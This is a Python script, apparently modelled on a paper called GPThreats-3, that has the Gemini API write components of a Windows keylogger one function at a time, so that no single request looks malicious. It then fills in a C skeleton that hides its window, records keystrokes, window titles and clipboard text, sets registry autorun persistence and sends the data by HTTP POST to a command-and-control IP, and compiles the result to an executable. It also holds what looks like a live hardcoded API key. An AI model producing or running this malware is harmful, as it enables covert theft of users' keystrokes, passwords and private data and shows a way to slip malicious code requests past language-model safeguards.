#!/usr/bin/env python3
"""
Gemini-Based Automated Keylogger Building Block Generator
With Hardcoded C2 IP and HTTP POST Exfiltration (CORRECTED VERSION)
Includes debug logging for network operations
Based on GPThreats-3 Paper Methodology
For Educational/Research Purposes Only
Usage: python gpt3_keylogger_no_antidebug.py C2_IP_ADDRESS
"""
import google.generativeai as genai
import time
import subprocess
import os
import sys
import shutil

# Configuration
GEMINI_API_KEY = "AIzaSyCRtQYOIEedxIZ0g5sfnVayHKhCxJyaC8U"  # Replace with your Gemini API key
MODEL = "gemini-2.5-flash-lite"  # or "gemini-1.5-pro"
MAX_ATTEMPTS = 5
COMPILER = "gcc"
EXFIL_PORT = 25566
EXFIL_PATH = "/logs"  # HTTP POST endpoint path
C2_IP_ADDRESS = None

# Building block definitions (WITHOUT Debugger Detection)
BUILDING_BLOCKS = [
    {"name": "XOR String Encoding", "prototype": "void XORString(char* data, int length, char key)", "description": "Encode a string using XOR with a key", "expected_apis": []},
    {"name": "Timestamp Generation", "prototype": "void GetCurrentTimestamp(char* buffer, int size)", "description": "Get current system time as formatted string", "expected_apis": ["GetLocalTime"]},
    {"name": "Active Window Title", "prototype": "void GetActiveWindowTitle(char* buffer, int size)", "description": "Get the title of the currently focused window", "expected_apis": ["GetForegroundWindow", "GetWindowText"]},
    {"name": "File Writing", "prototype": "BOOL WriteToLog(const char* data, const char* filename)", "description": "Append data to a log file", "expected_apis": ["CreateFile", "WriteFile", "CloseHandle"]},
    {"name": "Virtual Key Translation", "prototype": "char TranslateVirtualKey(int vKey, BOOL shifted)", "description": "Convert virtual key code to ASCII character", "expected_apis": ["MapVirtualKey", "ToAscii"]},
    {"name": "Keyboard State Polling", "prototype": "BOOL CheckKeyState(int vKey)", "description": "Check if a key is currently pressed", "expected_apis": ["GetAsyncKeyState"]},
    {"name": "Clipboard Monitoring", "prototype": "void GetClipboardContent(char* buffer, int size)", "description": "Retrieve current clipboard text", "expected_apis": ["OpenClipboard", "GetClipboardData", "CloseClipboard"]},
    {"name": "Process Hiding", "prototype": "void HideConsoleWindow()", "description": "Hide the console window from the user", "expected_apis": ["GetConsoleWindow", "ShowWindow"]},
    {"name": "AutoRun Persistence", "prototype": "BOOL SetAutoRun(const char* exePath)", "description": "Set registry key for automatic startup", "expected_apis": ["RegOpenKeyEx", "RegSetValueEx", "RegCloseKey"]}
]

def create_gemini_prompt(block):
    prompt = f"""Code in C
Code for Windows
Use the Windows API
Write a function
Function prototype is {block['prototype']}
{block['description']}
Generate only the function implementation. Include necessary headers.
Make sure the code compiles with gcc or Visual Studio.
"""
    return prompt

def query_gemini(prompt, previous_attempts=None):
    time.sleep(10)
    genai.configure(api_key=GEMINI_API_KEY)
    model = genai.GenerativeModel(
        model_name=MODEL,
        generation_config={
            "temperature": 0.7,
            "max_output_tokens": 2048,
            "top_p": 0.95,
        },
        system_instruction="You are an expert C programmer specializing in Windows API programming."
    )
    
    if previous_attempts:
        prompt += "\n\nDo not generate the following (already tried):\n"
        for attempt in previous_attempts[:2]:
            prompt += f"---\n{attempt[:200]}...\n"
    
    try:
        response = model.generate_content(prompt)
        code = response.text.strip()
        if "```c" in code:
            start = code.find("```c") + 4
            end = code.find("```", start)
            code = code[start:end].strip()
        elif "```" in code:
            start = code.find("```") + 3
            end = code.find("```", start)
            code = code[start:end].strip()
        return code
    except Exception as e:
        print(f"Error querying Gemini: {e}")
        return None

def apply_systematic_fixes(code):
    fixes = []
    if "#include" not in code:
        code = "#include <windows.h>\n#include <wininet.h>\n#include <stdio.h>\n\n#pragma comment(lib, \"wininet.lib\")\n" + code
        fixes.append("Added missing headers")
    
    replacements = {
        "CreateFileW": "CreateFileA",
        "GetWindowTextW": "GetWindowTextA",
        "RegOpenKeyExW": "RegOpenKeyExA",
        "RegSetValueExW": "RegSetValueExA",
        "InternetOpenW": "InternetOpenA",
        "InternetConnectW": "InternetConnectA",
        "HttpOpenRequestW": "HttpOpenRequestA",
        "HttpSendRequestW": "HttpSendRequestA"
    }
    
    for old, new in replacements.items():
        if old in code:
            code = code.replace(old, new)
            fixes.append(f"Fixed {old} -> {new}")
    
    if "cout" in code:
        code = code.replace("#include <iostream>", "#include <stdio.h>")
        fixes.append("Converted C++ to C")
    
    if fixes:
        print(f"Applied fixes: {', '.join(fixes)}")
    
    return code

def compile_code(code, output_name):
    temp_file = f"temp_{output_name}.c"
    with open(temp_file, 'w') as f:
        f.write(code)
    
    try:
        gcc_path = shutil.which("x86_64-w64-mingw32-gcc") or "gcc"
        cmd = [gcc_path, "-c", temp_file, "-o", f"{output_name}.o", 
               "-Wno-implicit-function-declaration", "-Wno-incompatible-pointer-types"]
        result = subprocess.run(cmd, capture_output=True, text=True, timeout=60)
        
        if result.returncode == 0:
            print("✓ Compilation successful")
            return True, None
        else:
            return False, result.stderr
    except Exception as e:
        return False, str(e)
    finally:
        if os.path.exists(temp_file):
            os.remove(temp_file)

def generate_building_block(block):
    print(f"\nGenerating: {block['name']}")
    previous_attempts = []
    
    for attempt in range(1, MAX_ATTEMPTS + 1):
        print(f"Attempt {attempt}/{MAX_ATTEMPTS}...")
        prompt = create_gemini_prompt(block)
        code = query_gemini(prompt, previous_attempts if attempt > 1 else None)
        
        if not code:
            continue
        
        code = apply_systematic_fixes(code)
        success, error = compile_code(code, block['name'].replace(' ', '_'))
        
        if success:
            print("✓ Building block generated successfully!")
            return code
        
        previous_attempts.append(code)
        time.sleep(1)
    
    print("✗ Failed to generate")
    return None

def generate_keylogger_skeleton(building_blocks):
    """Generate complete keylogger implementation with all components"""
    
    skeleton = f'''#include <windows.h>
#include <wininet.h>
#include <stdio.h>
#include <time.h>
#pragma comment(lib, "wininet.lib")
#pragma comment(lib, "user32.lib")

#define C2_IP_ADDRESS "{C2_IP_ADDRESS}"
#define C2_PORT {EXFIL_PORT}
#define C2_PATH "{EXFIL_PATH}"
#define LOG_FILE "system.log"
#define BUFFER_SIZE 8192
#define MAX_BUFFER_SIZE 4096

static BOOL g_networkEnabled = FALSE;
static char networkBuffer[MAX_BUFFER_SIZE] = {{0}};
static int networkBufferPos = 0;

// Function prototypes
'''
    
    for block in building_blocks:
        if block.get('code'):
            skeleton += f"{block['prototype']};\n"
    
    skeleton += '''BOOL SendDataToServer(const char* data);
BOOL InitializeNetwork();
void FlushNetworkBuffer();
void LogKeystroke(char key, const char* windowTitle);
void LogSpecialEvent(const char* eventType, const char* data);
void KeyloggerLoop();

// HTTP POST implementation
BOOL SendDataToServer(const char* data) {
    HINTERNET hInternet = InternetOpenA(
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64)", 
        INTERNET_OPEN_TYPE_DIRECT, NULL, NULL, 0);
    if (!hInternet) return FALSE;
    
    HINTERNET hConnect = InternetConnectA(
        hInternet, C2_IP_ADDRESS, C2_PORT, NULL, NULL, 
        INTERNET_SERVICE_HTTP, 0, 0);
    if (!hConnect) {
        InternetCloseHandle(hInternet);
        return FALSE;
    }
    
    LPCSTR acceptTypes[] = { "text/*", NULL };
    HINTERNET hRequest = HttpOpenRequestA(
        hConnect, "POST", C2_PATH, NULL, NULL, acceptTypes,
        INTERNET_FLAG_RELOAD | INTERNET_FLAG_NO_CACHE_WRITE, 0);
    if (!hRequest) {
        InternetCloseHandle(hConnect);
        InternetCloseHandle(hInternet);
        return FALSE;
    }
    
    DWORD dataLen = strlen(data);
    BOOL result = HttpSendRequestA(hRequest, "Content-Type: text/plain", -1, (LPVOID)data, dataLen);
    
    if (hRequest) InternetCloseHandle(hRequest);
    if (hConnect) InternetCloseHandle(hConnect);
    if (hInternet) InternetCloseHandle(hInternet);
    return result;
}

BOOL InitializeNetwork() {
    WriteToLog("NETWORK: WinINet initialized.", LOG_FILE);
    return TRUE;
}

void FlushNetworkBuffer() {
    if (networkBufferPos > 0 && g_networkEnabled) {
        networkBuffer[networkBufferPos] = '\\0';
        WriteToLog("FLUSH: Sending buffered data to server.", LOG_FILE);
        if (SendDataToServer(networkBuffer))
            WriteToLog("FLUSH: Buffer sent successfully.", LOG_FILE);
        else
            WriteToLog("FLUSH: Failed to send buffer.", LOG_FILE);
        networkBufferPos = 0;
    }
}

void LogKeystroke(char key, const char* windowTitle) {
    char timestamp[64];
    char logEntry[512];
    GetCurrentTimestamp(timestamp, sizeof(timestamp));
    snprintf(logEntry, sizeof(logEntry), "%s | %s | %c\\n", timestamp, windowTitle, key);
    WriteToLog(logEntry, LOG_FILE);
    
    if (g_networkEnabled) {
        int len = strlen(logEntry);
        if (networkBufferPos + len >= MAX_BUFFER_SIZE - 1)
            FlushNetworkBuffer();
        strcat(networkBuffer + networkBufferPos, logEntry);
        networkBufferPos += len;
    }
}

void LogSpecialEvent(const char* eventType, const char* data) {
    char timestamp[64];
    char logEntry[1024];
    GetCurrentTimestamp(timestamp, sizeof(timestamp));
    snprintf(logEntry, sizeof(logEntry), "%s | %s | %s\\n", timestamp, eventType, data);
    WriteToLog(logEntry, LOG_FILE);
    
    if (g_networkEnabled) {
        WriteToLog("EVENT: Sending special event to server.", LOG_FILE);
        if (SendDataToServer(logEntry))
            WriteToLog("EVENT: Special event sent successfully.", LOG_FILE);
        else
            WriteToLog("EVENT: Failed to send special event.", LOG_FILE);
    }
}

void KeyloggerLoop() {
    static BOOL keyPressed[256] = { 0 };
    static char lastWindow[BUFFER_SIZE] = { 0 };
    static char lastClipboard[BUFFER_SIZE] = { 0 };
    
    BOOL shiftPressed = CheckKeyState(VK_SHIFT) || CheckKeyState(VK_CAPITAL);
    
    char currentWindow[BUFFER_SIZE];
    GetActiveWindowTitle(currentWindow, sizeof(currentWindow));
    if (strcmp(currentWindow, lastWindow) != 0) {
        LogSpecialEvent("WINDOWCHANGE", currentWindow);
        strncpy(lastWindow, currentWindow, sizeof(lastWindow));
    }
    
    for (int vKey = 0x08; vKey < 0xFE; vKey++) {
        BOOL isPressed = CheckKeyState(vKey);
        if (isPressed && !keyPressed[vKey]) {
            keyPressed[vKey] = TRUE;
            char c = TranslateVirtualKey(vKey, shiftPressed);
            if (c != 0)
                LogKeystroke(c, currentWindow);
        }
        else if (!isPressed && keyPressed[vKey]) {
            keyPressed[vKey] = FALSE;
        }
    }
    
    static int clipboardCheckCounter = 0;
    if (++clipboardCheckCounter >= 100) {
        clipboardCheckCounter = 0;
        char currentClipboard[BUFFER_SIZE];
        GetClipboardContent(currentClipboard, sizeof(currentClipboard));
        if (strcmp(currentClipboard, lastClipboard) != 0 && strlen(currentClipboard) > 0) {
            LogSpecialEvent("CLIPBOARD", currentClipboard);
            strncpy(lastClipboard, currentClipboard, sizeof(lastClipboard));
        }
    }
    
    static int flushCounter = 0;
    if (++flushCounter >= 500) {
        flushCounter = 0;
        FlushNetworkBuffer();
    }
}

int main() {
    char startupMsg[512];
    
    // REMOVED: CheckDebugger() - anti-debug check removed
    
    HideConsoleWindow();
    WriteToLog("KEYLOGGER STARTUP\\n", LOG_FILE);
    snprintf(startupMsg, sizeof(startupMsg), "CONFIG: C2 Server http://%s:%d%s\\n", C2_IP_ADDRESS, C2_PORT, C2_PATH);
    WriteToLog(startupMsg, LOG_FILE);
    
    if (InitializeNetwork()) {
        g_networkEnabled = TRUE;
        WriteToLog("NETWORK: Network enabled, testing connection...\\n", LOG_FILE);
        char testMsg[256];
        snprintf(testMsg, sizeof(testMsg), "STARTUP: Keylogger initialized at http://%s:%d%s", C2_IP_ADDRESS, C2_PORT, C2_PATH);
        if (SendDataToServer(testMsg))
            WriteToLog("NETWORK: Successfully connected to C2 server!\\n", LOG_FILE);
        else
            WriteToLog("NETWORK: WARNING: Failed to connect to C2 server, will continue local logging.\\n", LOG_FILE);
    }
    else {
        WriteToLog("NETWORK: ERROR: Network initialization failed.\\n", LOG_FILE);
    }
    
    char exePath[MAX_PATH];
    GetModuleFileNameA(NULL, exePath, MAX_PATH);
    SetAutoRun(exePath);
    
    WriteToLog("STARTUP: Entering main loop\\n", LOG_FILE);
    
    while (TRUE) {
        KeyloggerLoop();
        Sleep(10);
    }
    return 0;
}
'''
    
    return skeleton

def main():
    global C2_IP_ADDRESS
    
    print("=" * 70)
    print("Gemini Keylogger Generator - WITHOUT Anti-Debug (CORRECTED)")
    print("=" * 70)
    
    if len(sys.argv) < 2:
        print(f"\nUsage: python {sys.argv[0]} <C2_IP_ADDRESS>")
        sys.exit(1)
    
    C2_IP_ADDRESS = sys.argv[1]
    parts = C2_IP_ADDRESS.split('.')
    if len(parts) != 4 or not all(p.isdigit() and 0 <= int(p) <= 255 for p in parts):
        print(f"\nInvalid IP: {C2_IP_ADDRESS}")
        sys.exit(1)
    
    print(f"\n[*] C2 Server: http://{C2_IP_ADDRESS}:{EXFIL_PORT}{EXFIL_PATH}")
    print("[*] Protocol: HTTP POST")
    print("[*] Debug logging: Enabled (writes to system.log)")
    print("[*] Anti-Debug: REMOVED")
    
    if GEMINI_API_KEY == "your-api-key-here":
        print("\n⚠ Set GEMINI_API_KEY first!")
        return
    
    start_time = time.time()
    results = []
    
    for block in BUILDING_BLOCKS:
        code = generate_building_block(block)
        results.append({
            "name": block["name"],
            "prototype": block["prototype"],
            "code": code,
            "success": code is not None
        })
    
    elapsed = time.time() - start_time
    successful = sum(1 for r in results if r["success"])
    
    print("\n" + "=" * 70)
    print(f"GENERATION COMPLETE - {elapsed:.1f}s - {successful}/{len(BUILDING_BLOCKS)} blocks")
    print("=" * 70)
    
    output_file = f"generated_keylogger_http_{C2_IP_ADDRESS.replace('.', '_')}.c"
    with open(output_file, 'w') as f:
        f.write(f"// Auto-generated keylogger with HTTP POST exfiltration (CORRECTED)\n")
        f.write(f"// C2: http://{C2_IP_ADDRESS}:{EXFIL_PORT}{EXFIL_PATH}\n")
        f.write(f"// Debug logging enabled in system.log\n")
        f.write(f"// Anti-Debug: REMOVED\n\n")
        
        for r in results:
            if r["success"]:
                f.write(f"// {r['name']}\n{r['code']}\n\n")
        
        f.write(generate_keylogger_skeleton(results))
    
    print(f"\nSaved: {output_file}")
    
    print("=" * 70)
    print("AUTOMATIC COMPILATION")
    print("=" * 70)
    
    exe_output = f"keylogger_http_{C2_IP_ADDRESS.replace('.', '_')}.exe"
    compilers = [shutil.which("x86_64-w64-mingw32-gcc"), "/usr/bin/x86_64-w64-mingw32-gcc"]
    gcc_path = None
    for c in compilers:
        if c and os.path.exists(c):
            gcc_path = c
            break
    
    if not gcc_path:
        print("\n⚠ MinGW not found!")
        print(f"Manual: x86_64-w64-mingw32-gcc {output_file} -o {exe_output} -luser32 -lwininet -mwindows")
    else:
        print(f"\n[*] Compiler: {gcc_path}")
        print(f"[*] Compiling {output_file}...")
        cmd = [gcc_path, output_file, "-o", exe_output, "-luser32", "-lwininet", "-mwindows", "-O2", "-s"]
        
        try:
            result = subprocess.run(cmd, capture_output=True, text=True, timeout=120)
            if result.returncode == 0 and os.path.exists(exe_output):
                size = os.path.getsize(exe_output) / 1024
                print(f"\n✓ SUCCESS!")
                print(f"✓ Executable: {exe_output} ({size:.1f} KB)")
                print("\n" + "=" * 70)
                print("TESTING INSTRUCTIONS")
                print("=" * 70)
                print(f"\n1. Start HTTP server:")
                print(f"   python http_c2_server.py {EXFIL_PORT}")
                print(f"\n2. Run keylogger:")
                print(f"   wine {exe_output}  # or run on Windows")
                print(f"\n3. Check debug log:")
                print(f"   tail -f system.log")
                print(f"\n4. Verify HTTP POSTs:")
                print(f"   curl -X POST http://{C2_IP_ADDRESS}:{EXFIL_PORT}{EXFIL_PATH} -d \"test\"")
                print(f"\nThe keylogger will log ALL network attempts to system.log")
            else:
                print(f"\n✗ Compilation failed: {result.stderr}")
        except Exception as e:
            print(f"\n✗ Error: {e}")
    
    print("\n⚠ Educational use only!")

if __name__ == "__main__":
    main()
